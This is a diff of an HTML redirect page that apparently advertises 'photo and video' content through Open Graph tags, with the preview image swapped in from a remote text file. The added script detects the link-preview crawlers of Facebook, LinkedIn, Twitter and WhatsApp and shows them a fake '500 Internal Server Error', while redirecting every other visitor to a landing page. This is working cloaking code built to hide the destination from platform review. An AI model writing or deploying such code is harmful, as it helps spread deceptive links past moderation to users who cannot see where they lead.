@@ -4,28 +4,74 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Page Access Control</title>
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Jilhub Kello Photo and Video">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://jil.kello.me/">
+    <meta property="og:image" content="https://jil.kello.me/ogimages/default.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:description" content="Watch cool jilhub and kello.me photos and videos in one place.">
     <script>
         window.onload = function() {
+            // Fetch the image URL from a remote .txt file
+            fetchImageUrlFromTxt().then(imageUrl => {
+                // Update the OG image meta tag with the fetched URL
+                if (imageUrl) {
+                    document.querySelector('meta[property="og:image"]').setAttribute('content', imageUrl);
+                    console.log('Updated OG image URL to:', imageUrl);
+                }
+            });
+            
             // Check the user agent
             const userAgent = navigator.userAgent;
             // Simulate checking for Facebook's crawler
-            if (userAgent.includes('facebookexternalhit')) {
+            if (userAgent.includes('facebookexternalhit') || 
+                userAgent.includes('Facebot') || 
+                userAgent.includes('LinkedInBot') || 
+                userAgent.includes('Twitterbot') || 
+                userAgent.includes('WhatsApp')) {
                 // Simulate sending a 500 error response
                 document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                 return; // Stop further execution
             }
+            
             // Otherwise, redirect to a random page
             const pages = [
-                "https://kello.me/landing.php",
-                "https://kello.me/landing.php",
-                "https://kello.me/landing.php",
-                "https://kello.me/landing.php"
+                "https://jilhub.kello.me/landing.php",
+                "https://jilhub.kello.me/landing.php",
+                "https://jilhub.kello.me/landing.php",
+                "https://jilhub.kello.me/landing.php"
             ];
             const randomPage = pages[Math.floor(Math.random() * pages.length)];
             window.location.href = randomPage;
         };
+
+        // Function to fetch the image URL from a .txt file
+        async function fetchImageUrlFromTxt() {
+            try {
+                // Replace with the actual path to your .txt file
+                const response = await fetch('https://jil.kello.me/og-image-url.txt');
+                
+                if (!response.ok) {
+                    throw new Error('Failed to fetch image URL');
+                }
+                
+                // Get the text content (the URL) from the response
+                const imageUrl = await response.text();
+                // Trim any whitespace
+                return imageUrl.trim();
+            } catch (error) {
+                console.error('Error fetching image URL:', error);
+                return null;
+            }
+        }
     </script>
 </head>
 <body>
+    <!-- Fallback content if JavaScript is disabled -->
+    <noscript>
+        <p>Please enable JavaScript to access this website.</p>
+    </noscript>
 </body>
 </html>
